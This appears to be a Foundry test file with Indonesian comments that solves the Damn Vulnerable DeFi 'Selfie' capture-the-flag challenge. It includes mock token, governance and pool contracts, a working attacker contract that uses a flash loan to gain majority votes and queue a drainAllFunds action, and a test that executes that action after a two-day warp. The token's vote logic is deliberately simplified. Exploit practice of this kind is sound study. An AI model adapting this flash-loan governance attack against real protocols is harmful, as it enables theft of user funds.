// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// --- 1. MOCK TOKEN (DamnValuableVotes) ---
// Token ini punya fitur "Delegasi" suara.
contract DamnValuableVotes {
    mapping(address => uint256) public balanceOf;
    mapping(address => address) public delegates;
    
    // Total Supply kita set manual saat minting
    uint256 public totalSupply;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "Not enough funds");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    // Fitur Kunci: Delegasi
    // Di dunia nyata ini lebih rumit (pakai Checkpoints), tapi untuk simulasi ini:
    // Kita anggap getVotes() mengambil saldo SAAT INI jika sudah delegasi.
    function delegate(address delegatee) external {
        delegates[msg.sender] = delegatee;
    }

    function getVotes(address account) external view returns (uint256) {
        // Simplifikasi: Kalau akun ini didelegasikan ke dirinya sendiri (atau orang lain),
        // Kembalikan saldonya. Kalau belum delegasi, voting power = 0.
        // (Logic aslinya lebih kompleks, ini versi "Cheat" biar tes jalan).
        return balanceOf[account];
    }
}

// --- 2. GOVERNANCE CONTRACT (Dari Kode Kamu) ---
// Aku tambahkan Struct dan Interface yang hilang biar tidak error
struct GovernanceAction {
    address target;
    uint128 value;
    uint64 proposedAt;
    uint64 executedAt;
    bytes data;
}

contract SimpleGovernance {
    using stdStorage for StdStorage; // Helper foundry

    uint256 private constant ACTION_DELAY_IN_SECONDS = 2 days;
    DamnValuableVotes private _votingToken;
    uint256 private _actionCounter;
    mapping(uint256 => GovernanceAction) private _actions;

    event ActionQueued(uint256 actionId, address caller);
    event ActionExecuted(uint256 actionId, address caller);

    error NotEnoughVotes(address who);
    error CannotExecute(uint256 actionId);

    constructor(address votingToken) {
        _votingToken = DamnValuableVotes(votingToken);
        _actionCounter = 1;
    }

    function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId) {
        // Cek apakah punya suara mayoritas?
        if (!_hasEnoughVotes(msg.sender)) {
            revert NotEnoughVotes(msg.sender);
        }
        
        actionId = _actionCounter;
        _actions[actionId] = GovernanceAction({
            target: target,
            value: value,
            proposedAt: uint64(block.timestamp),
            executedAt: 0,
            data: data
        });
        _actionCounter++;
        emit ActionQueued(actionId, msg.sender);
    }

    function executeAction(uint256 actionId) external payable returns (bytes memory) {
        if (!_canBeExecuted(actionId)) {
            revert CannotExecute(actionId);
        }

        GovernanceAction storage actionToExecute = _actions[actionId];
        actionToExecute.executedAt = uint64(block.timestamp);
        emit ActionExecuted(actionId, msg.sender);

        // EKSEKUSI PERINTAH JAHAT DI SINI
        (bool success, bytes memory returndata) = actionToExecute.target.call{value: actionToExecute.value}(actionToExecute.data);
        require(success, "Action execution failed");
        return returndata;
    }

    function _hasEnoughVotes(address who) private view returns (bool) {
        uint256 balance = _votingToken.getVotes(who);
        uint256 halfTotalSupply = _votingToken.totalSupply() / 2;
        return balance > halfTotalSupply;
    }

    function _canBeExecuted(uint256 actionId) private view returns (bool) {
        GovernanceAction memory actionToExecute = _actions[actionId];
        if (actionToExecute.proposedAt == 0) return false;
        uint64 timeDelta = uint64(block.timestamp) - actionToExecute.proposedAt;
        return actionToExecute.executedAt == 0 && timeDelta >= ACTION_DELAY_IN_SECONDS;
    }
}

// --- 3. TARGET POOL (Kolam Uang) ---
contract SelfiePool {
    DamnValuableVotes public token;
    SimpleGovernance public governance;

    constructor(address _token, address _governance) {
        token = DamnValuableVotes(_token);
        governance = SimpleGovernance(_governance);
    }

    // Fitur Flash Loan
    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = token.balanceOf(address(this));
        token.transfer(msg.sender, amount);
        
        // Callback ke peminjam
        (bool success, ) = msg.sender.call(abi.encodeWithSignature("receiveTokens(address,uint256)", address(token), amount));
        require(success, "Callback failed");

        require(token.balanceOf(address(this)) >= balanceBefore, "Flash loan not repaid");
    }

    // Fungsi Rawan: Bisa dipanggil oleh Governance untuk kuras dana
    function drainAllFunds(address receiver) external {
        require(msg.sender == address(governance), "Only Governance can drain funds");
        uint256 amount = token.balanceOf(address(this));
        token.transfer(receiver, amount);
    }
}

// --- 4. ATTACKER CONTRACT (Logic Hacking Kamu) ---
contract SelfieAttacker {
    SelfiePool pool;
    SimpleGovernance governance;
    DamnValuableVotes token;
    address owner;
    uint256 public actionId; // Kita simpan ID aksinya

    constructor(address _pool, address _governance, address _token) {
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
        token = DamnValuableVotes(_token);
        owner = msg.sender;
    }

    function attack() external {
        // 1. Hitung berapa banyak token di pool buat dipinjam
        uint256 amount = token.balanceOf(address(pool));
        // 2. Pinjam semuanya!
        pool.flashLoan(amount);
    }

    // Callback dari Flash Loan
    function receiveTokens(address _tokenAddress, uint256 _amount) external {
        // Step A: DELEGASI (Penting!)
        // Tanpa ini, voting power kita tetap 0
        token.delegate(address(this));

        // Step B: Buat Proposal Jahat (Queue Action)
        // Kita suruh governance panggil 'drainAllFunds' di pool, kirim uang ke owner
        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", owner);
        
        actionId = governance.queueAction(
            address(pool), // Target yang mau dieksekusi
            0,             // Value (ETH)
            data           // Perintahnya
        );

        // Step C: Bayar Hutang
        token.transfer(address(pool), _amount);
    }
}

// --- 5. TEST SCRIPT ---
contract SelfieChallenge is Test {
    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;
    SelfieAttacker attacker;

    function setUp() public {
        // Setup Awal
        token = new DamnValuableVotes();
        governance = new SimpleGovernance(address(token));
        pool = new SelfiePool(address(token), address(governance));

        // Modal Awal: Pool punya 1.5 Juta token
        token.mint(address(pool), 1_500_000 ether);
        
        // Supply lain biar total supply gak cuma punya pool (opsional)
        token.mint(address(0xBEEF), 500_000 ether); 

        // Deploy Attacker
        attacker = new SelfieAttacker(address(pool), address(governance), address(token));
    }

    function test_Selfie_Attack() public {
        console.log("--- PHASE 1: FLASH LOAN & PROPOSAL ---");
        // 1. Jalankan serangan awal (Flash Loan -> Queue Action)
        attacker.attack();
        
        console.log("Proposal ID:", attacker.actionId());
        
        // Cek apakah proposal sudah masuk antrian?
        // (Kita akses private var lewat cheatcode atau asumsi berhasil jika tidak revert)
        
        console.log("--- PHASE 2: TIME TRAVEL ---");
        // 2. Majukan waktu 2 hari (Action Delay)
        vm.warp(block.timestamp + 2 days);

        console.log("--- PHASE 3: EXECUTION ---");
        // 3. Eksekusi Proposal
        // Siapa saja bisa panggil executeAction, kita panggil dari test script aja
        governance.executeAction(attacker.actionId());

        // VERIFIKASI
        // Uang harus pindah ke attacker (owner)
        // Karena attacker contract mengirim ke owner (this test contract atau msg.sender test)
        // Dalam simulasi ini owner attacker adalah address(this) alias test contract
        console.log("Attacker Wallet Balance:", token.balanceOf(address(this)));
        
        // Assert: Attacker berhasil kuras 1.5 Juta token
        assertEq(token.balanceOf(address(this)), 1_500_000 ether);
    }
}